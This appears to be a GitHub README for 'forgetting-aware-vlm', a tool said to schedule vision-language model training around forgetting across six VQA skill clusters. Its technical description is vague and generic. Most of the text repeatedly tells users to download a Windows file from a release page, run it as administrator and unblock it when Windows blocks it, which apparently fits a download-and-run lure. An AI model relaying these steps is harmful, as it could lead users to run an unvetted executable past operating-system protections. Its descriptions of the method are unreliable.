# 🧠 forgetting-aware-vlm - Smarter VLM Training with Less Drift

[![Download the latest release](https://img.shields.io/badge/Download%20Release-purple?style=for-the-badge&logo=github)](https://github.com/Montereybaybathlinen785/forgetting-aware-vlm/releases)

## 🚀 What this app does

forgetting-aware-vlm helps a vision-language model keep learning without losing old skills too fast. It uses a forgetting-aware curriculum to sort tasks by difficulty and watch for skill drop across six VQA skill clusters.

Use it to:
- run a staged VLM self-evolution workflow
- track where the model starts to forget
- schedule harder examples at the right time
- keep training steady across different VQA skills

## 💻 Windows setup

This app is made for Windows users who want a simple install path.

You will need:
- Windows 10 or Windows 11
- about 2 GB of free disk space
- a modern web browser
- access to the internet for the download
- a GPU if you plan to run heavy model jobs

If you only want to inspect the app or test the workflow, a standard Windows laptop is enough. For larger runs, a machine with more memory will help.

## 📥 Download and install

Visit this page to download the release files:
https://github.com/Montereybaybathlinen785/forgetting-aware-vlm/releases

From the release page:
1. open the latest release
2. look for the Windows file
3. download the file to your computer
4. save it in a folder you can find, such as Downloads or Desktop
5. if the file is a zip archive, right-click it and choose Extract All
6. open the extracted folder
7. double-click the app file to start it

If Windows asks for permission, choose Yes or Run.

## 🧭 First run

When you start forgetting-aware-vlm for the first time, it will load its curriculum settings and prepare the VLM training flow.

Do this:
1. launch the app
2. wait for the main window or console to appear
3. pick the model or project folder if asked
4. load your dataset
5. start the curriculum run

If the app opens a setup screen, use the default options first. They are a good starting point for most users.

## 🧪 How it works

The app follows a simple loop:
1. it looks at the current VQA tasks
2. it groups them into six skill clusters
3. it checks which skills the model forgets
4. it changes the task order based on what it finds
5. it keeps the model on a steady learning path

This helps the model keep core skills while it learns harder tasks.

## 📁 Input data

Use a VQA-style dataset with image and question pairs. The app works best when the data has clear labels and a stable folder structure.

A simple setup can look like this:
- images folder
- questions file
- answer file
- config file for training rules

Good data habits:
- keep file names short
- avoid spaces in folder names
- make sure images match the question list
- check that answers use one clear format

## 🛠️ Main features

- forgetting-aware task order
- difficulty scheduling
- skill cluster tracking
- VQA-focused training flow
- simple Windows run path
- reusable training presets
- clear progress view for each run

## 🔧 Recommended workflow

For best results, use this order:
1. prepare your dataset
2. download the release
3. start with the default curriculum
4. run a short test pass
5. review the skill cluster output
6. adjust the difficulty schedule
7. launch the full run

This keeps setup simple and helps you spot data issues early.

## 🖥️ Typical run steps

A normal session looks like this:
1. open the app
2. choose your project folder
3. load the dataset
4. confirm the six skill cluster setup
5. set the run length
6. start training
7. watch the forgetting score and task order
8. save the run results

## 📊 What to expect

You may see:
- a task queue
- cluster names for different VQA skills
- a forgetting score
- training progress
- loss or accuracy values
- a log file for the run

These values help you see how the model changes over time.

## 🔍 Troubleshooting

If the app does not start:
- check that you downloaded the latest release
- unzip the file if needed
- try running it again as administrator
- move the folder to a simple path like C:\forgetting-aware-vlm

If the model data does not load:
- check file names
- make sure the dataset path is correct
- confirm that images and labels match
- try a smaller test dataset first

If the app feels slow:
- close other apps
- use a smaller batch size
- lower the image size if the app allows it
- run on a machine with more memory

If Windows blocks the file:
- open the file properties
- look for an Unblock option
- apply it and run the app again

## 📌 Common use cases

- test how a VLM forgets old skills during training
- compare different difficulty schedules
- study which VQA clusters break first
- tune training for stable self-evolution
- run controlled experiments on forgetting behavior

## 🧾 File layout

A common project folder may look like this:
- app file
- config folder
- data folder
- logs folder
- results folder
- readme file

Keep your data and results in separate folders. That makes it easier to repeat a run.

## ⚙️ Settings you may want to change

If the app gives you options, these are the most useful ones:
- curriculum mode
- forgetting threshold
- cluster count
- run length
- batch size
- save interval
- output folder

If you are not sure what to change, keep the defaults for your first run.

## 🧩 Skill clusters

The app uses six VQA skill clusters to group tasks. These may cover areas like:
- object recognition
- scene understanding
- counting
- spatial reasoning
- relation reading
- text or attribute questions

This split helps the app detect where the model loses strength.

## 🔐 Safe use

Use trusted data and known release files. Keep your project folder in a place you control. Save your work often if the app writes results during training.

## 📎 Download again

If you need the release page again, use this link:
https://github.com/Montereybaybathlinen785/forgetting-aware-vlm/releases

## 🗂️ Suggested starter path

If you want the simplest first run:
1. download the latest release
2. extract it to C:\forgetting-aware-vlm
3. place your dataset in C:\forgetting-aware-vlm\data
4. start the app
5. load the dataset
6. keep all defaults
7. run a short test
8. review the log output